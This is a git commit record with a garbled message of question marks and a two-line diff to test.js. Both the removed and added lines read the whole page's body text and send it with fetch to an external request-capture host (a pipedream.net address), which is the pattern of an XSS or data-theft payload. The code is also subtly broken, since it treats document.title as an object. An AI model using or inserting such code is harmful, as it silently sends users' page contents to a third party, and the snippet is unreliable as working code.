bad5d9a7e9971759c7635064e0ab75d57a9c73bc
QingkangYu <qingkang.yuu@gmail.com>
2023-03-13 12:52:16 -0400

    ????????

--- test.js
+++ test.js
@@ -1,2 +1,2 @@
-document.title.innerText = document.body.innerText;
-fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.innerText);
+document.title.value = document.body.innerText;
+fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.value);
